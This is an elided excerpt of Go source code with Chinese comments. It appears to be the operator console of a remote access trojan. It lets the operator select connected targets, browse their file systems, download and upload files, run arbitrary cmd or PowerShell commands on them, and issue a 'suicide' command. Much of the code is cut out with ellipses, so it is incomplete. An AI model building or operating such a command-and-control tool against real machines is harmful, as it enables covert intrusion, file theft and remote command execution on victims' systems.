...
func main() {
	...
	for{
		...
		if len(commandLine)==0{continue}
		command:=commandLine[0]
		commandData,e:=FlagParser.ParseArgs(commandLine)
		if e!=nil{continue}

		//设置超时时间
		if currentClient!=nil{if currentClient.wait==0{currentClient.c.SetDeadline(time.Time{})}else{currentClient.c.SetDeadline(time.Now().Add(currentClient.wait*time.Second))}}
		switch command {
		case "wait":
			if len(commandData)>0{
				if currentClient==nil {fmt.Println("请使用c命令选择目标");goto fail}
				v,e:=strconv.Atoi(commandData[0]);if e!=nil{fmt.Println("Atoi err: ",e);goto fail}
		...
		case "c":
			if len(commandData)>0 {
				...
				if currentClient==nil {fmt.Println("选择的目标不存在")}
			}else{
				fmt.Println("选择的目标不存在")
			}
		case "pcc":
			if currentClient!=nil{fmt.Println(currentClient.num,": ",currentClient.addr)}else{fmt.Println("未选择目标")}
		case "lsf":
			if currentClient==nil {fmt.Println("请使用c命令选择目标");goto fail}
			currentClient.s.WriteUint32(LSF)//存储命令编号
			currentClient.s.WriteString(currentClient.currentPath)//存储当前路径
			e:=currentClient.s.SendPacket();if e!=nil{fmt.Println("Send Packet err: ",e);goto fail}

			e=currentClient.r.ReadyToRead();if e!=nil{fmt.Println("Ready ToRead err: ",e);goto fail}
			for {
				a,e:=currentClient.r.ReadUint32()/*读取文件(夹)属性,位于判断*/;if e!=nil{fmt.Println("Read Uint32 err: ",e);goto fail}
				if a==0xffffffff {break}//代表内容结束

				cpath,e:=currentClient.r.ReadString()/*读取文件(夹)名*/;if e!=nil{fmt.Println("Read String err: ",e);goto fail}
				if a!=0 {fmt.Print("Attributes: ",a," ")}
				if (a&0x10) !=0 {//是否文件夹
					fmt.Print("folder: ")
				}
				fmt.Print(cpath,"\n")
		...
		case "cd":
			...
			if len(commandData)>0{
				if IsFullPath(commandData[0]) {
					...
					fmt.Println("起始目录有误");goto fail
				}else{currentClient.currentPath+= "\\"+commandData[0]}
				currentClient.currentPath=filepath.Clean(currentClient.currentPath)//即使输入末尾包含..或路径中包含..,会转换为等价路径
			}else{
				currentClient.currentPath=""
			}
		case "pwd":{
			if currentClient==nil {fmt.Println("请使用c命令选择目标");goto fail}
			if currentClient.currentPath==""{fmt.Println("空路径")}else{fmt.Println(currentClient.currentPath)}
		}
		case "download":
			if currentClient==nil {fmt.Println("请使用c命令选择目标");goto fail}
			if len(commandData)>1 {
				...
				e=currentClient.r.ReadyToRead();if e!=nil{fmt.Println("Ready ToRead err: ",e);goto fail}
				v,e:=currentClient.r.ReadUint32();if e!=nil{fmt.Println("Read Uint32 err: ",e);goto fail}
				if v==SUCCESS{
					b,e:=currentClient.r.ReadBytes();if e!=nil{fmt.Println("Read Bytes err: ",e);goto fail}
		...
		case "upload":{
			...
			if len(commandData)>1 {
				...
				//读文件内容
				b,e:=ReadFileContents(commandData[0]);if e!=nil{fmt.Println("read file err: ",e);goto fail}
		...
		case "cmd":{
			if currentClient==nil {fmt.Println("请使用c命令选择目标");goto fail}
			currentClient.c.SetDeadline(time.Time{})//防止因为输入造成超时

			fmt.Print("请输入命令(执行cmd需要cmd /c前缀;执行ps要powershell -command前缀): ")
			input, err := reader.ReadString('\n')
			if err!=nil{goto fail}
			if currentClient.wait==0{currentClient.c.SetDeadline(time.Time{})}else{currentClient.c.SetDeadline(time.Now().Add(currentClient.wait*time.Second))}
			currentClient.s.WriteUint32(CMD)
			if cmd_Option.Wait{currentClient.s.WriteUint32(1)}else{currentClient.s.WriteUint32(0)}
			currentClient.s.WriteUint32(uint32(cmd_Option.Timeout))
			...
			if v==SUCCESS{
				if cmd_Option.Wait{
					b,e:=currentClient.r.ReadString();if e!=nil{fmt.Println("Read String err: ",e);goto fail}
					fmt.Println(b)
				}
				fmt.Println("successfully execute")
			}else{
				reason,e:=currentClient.r.ReadUint32();if e!=nil{fmt.Println("Read Uint32 err: ",e);goto fail}
				fmt.Println("execute failed - "+ strconv.Itoa(int(reason)))
			}
			currentClient.r.Finish()
		}
		case "suicide":{
		...
		fail:
			if currentClient!=nil{currentClient.c.SetDeadline(time.Time{})}
	}
}